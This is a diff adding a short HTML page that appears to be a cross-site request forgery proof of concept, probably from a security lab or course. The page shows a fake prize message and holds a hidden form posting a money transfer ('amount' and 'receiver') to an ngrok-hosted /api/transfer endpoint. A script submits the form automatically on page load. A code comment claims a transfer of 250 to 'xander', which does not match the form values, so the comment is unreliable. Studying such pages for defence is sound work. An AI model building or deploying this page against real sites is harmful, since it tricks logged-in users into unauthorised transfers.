@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+    <title>YOU WIN!!!</title>
+    <h1>Congratulations, please collect your prize below:</h1>
+
+    <form id="csrfForm" action=" https://wisplike-chirping-flashcard.ngrok-free.dev/api/transfer" method="POST">
+        <input type="hidden" name="amount" value="1"/>
+        <input type="hidden" name="receiver" value="guy"/>
+    </form>
+
+    <script>
+        window.onload = function() {
+            // posts the form to the transfer endpoint, transferring 250 to xander
+            document.getElementById("csrfForm").submit();
+        }
+    </script>
+</html>
